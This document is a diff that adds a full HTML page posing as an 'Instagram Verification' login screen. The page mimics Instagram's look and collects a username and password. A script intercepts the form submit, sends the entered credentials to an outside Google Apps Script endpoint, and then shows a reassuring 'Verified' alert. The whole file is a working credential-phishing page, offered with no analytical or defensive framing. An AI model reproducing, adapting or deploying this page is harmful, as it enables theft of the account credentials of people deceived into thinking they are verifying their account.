@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<title> Instagram Verification </title>
+
+<link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">
+
+<style>
+
+* {
+  margin: 0px;
+  padding: 0px;
+}
+
+body {
+  background-color: #eee;
+}
+
+#wrapper {
+  width: 500px;
+  height: 50%;
+  overflow: hidden;
+  border: 0px solid #000;
+  margin: 50px auto;
+  padding: 10px;
+}
+
+.main-content {
+  width: 250px;
+  height: 40%;
+  margin: 10px auto;
+  background-color: #fff;
+  border: 2px solid #e6e6e6;
+  padding: 40px 50px;
+}
+
+.header {
+  border: 0px solid #000;
+  margin-bottom: 5px;
+}
+
+.header img {
+  height: 50px;
+  width: 175px;
+  margin: auto;
+  position: relative;
+  left: 40px;
+}
+
+.input-1,
+.input-2 {
+  width: 100%;
+  margin-bottom: 5px;
+  padding: 8px 12px;
+  border: 1px solid #dbdbdb;
+  box-sizing: border-box;
+  border-radius: 3px;
+}
+
+.overlap-text {
+  position: relative;
+}
+
+.btn {
+  width: 100%;
+  background-color: #3897f0;
+  border: 1px solid #3897f0;
+  padding: 5px 12px;
+  color: #fff;
+  font-weight: bold;
+  cursor: pointer;
+  border-radius: 3px;
+}
+
+</style>
+
+</head>
+
+<body>
+
+
+
+<div id="wrapper">
+<div class="main-content">
+
+    <div class="header">
+      <img src="https://i.imgur.com/zqpwkLQ.png" />
+    </div>
+
+    <form method="post" autocomplete="off" name="google-sheet">
+
+    <div class="l-part">
+
+    <input type="text" name="Name" placeholder="Username or Email Or Phone" class="input-1" required="" />
+      
+    <div class="overlap-text">
+    <input type="password" name="Password" placeholder="Password" class="input-2" required="" />
+    </div>
+
+    <input type="submit" name="submit" value="Log in" class="btn" />
+    </div>
+
+    </form>
+
+</div>
+</div>
+
+<script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbxjOEUNrshP3BMc2HDYEWvwws21EpQouBTZauIU8KaUMWeYr3E/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Verified"))
+                .catch(error => console.error('Error!', error.message))
+            })
+          </script>
+
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+</body>
+</html>
+
+
+
+
